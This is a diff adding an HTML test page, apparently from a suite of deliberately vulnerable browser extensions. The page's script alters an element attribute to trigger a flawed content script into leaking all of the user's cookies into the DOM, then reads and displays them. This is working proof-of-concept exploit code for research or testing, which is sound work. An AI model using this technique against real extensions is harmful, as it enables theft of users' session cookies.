@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>A malicious website</title>
+	</head>
+	<body>
+
+		<h1>A malicious website</h1>
+
+		<!-- /vuln01_weak_mv3_dom -->
+		<!--
+		The content script of this extension leaks sensitive data that it received from the service worker (namely all of the user's cookies)
+		into the DOM of a (potentially malicious) website (namely into an attribute called "cookies" of an element with id "some-id") after
+		this website triggers a very certain DOM event (namely changing an attribute called "data-some-attr" of an element with id "some-id").
+		-->
+		<span id="some-id" data-some-attr="foo">This is a totally benign piece of text.</span><br/>
+		<span id="cookies"></span>
+		<script>
+			setTimeout(function() {
+				// Trigger a DOM event and therefore trigger the vulnerable extension (/vuln01_weak_mv3_dom) to leak sensitive data
+				//     (into a newly created "cookies" attribute of the "some-id" <span> element):
+				document.getElementById('some-id').setAttribute("data-some-attr", "bar");
+			}, 100);
+
+			setTimeout(function() {
+				// Access the leaked sensitive data:
+				let leaked_cookie_data = document.getElementById('some-id').getAttribute("cookies");
+				document.getElementById('cookies').innerText =
+					"Leaked cookie data: " + leaked_cookie_data.substring(0, 1000) + " ... " + leaked_cookie_data.substring(leaked_cookie_data.length-1000);
+			}, 300);
+		</script>
+
+	</body>
+</html>
